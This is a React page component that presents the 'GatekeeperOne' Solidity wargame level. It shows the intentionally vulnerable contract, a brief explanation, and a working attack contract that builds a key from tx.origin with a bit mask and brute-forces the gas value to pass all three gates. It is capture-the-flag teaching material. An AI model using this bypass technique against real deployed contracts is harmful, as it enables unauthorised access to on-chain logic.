import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const GatekeeperOne = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
  // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}`;

  const solutionCode = `
  // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatePassOneAttack {
    event Entered(bool success);

    function enterGate(address _gateAddr) public returns (bool) {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;

        bool succeeded = false;
        for (int i = -100; i < 100; i++) {
          (bool success, ) = address(_gateAddr).call{gas: uint256(65782+i)}(abi.encodeWithSignature("enter(bytes8)", key));
          if (success) {
            succeeded = success;
            break;
          }
        }

        emit Entered(succeeded);

        return succeeded;
    }
}
`;

  return (
    <div>
      <h1 className="headerText">GatekeeperOne</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="
          For the first check we just need to use intermediate contract,
          For the second one we need to calculate gas remaining, which we can do in two ways, first one
          is just bruth-force the whole values with high gas, for example 90.000 + 8191,
          Or debug with remix and see remaining gas
          For third check we need to create one key which is coming from tx.origin and manipulate it, for passing all checks, so we just need to take last
          8 bytes of tx.origin and 0xffffffff0000ffff this mask.
          "
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default GatekeeperOne;
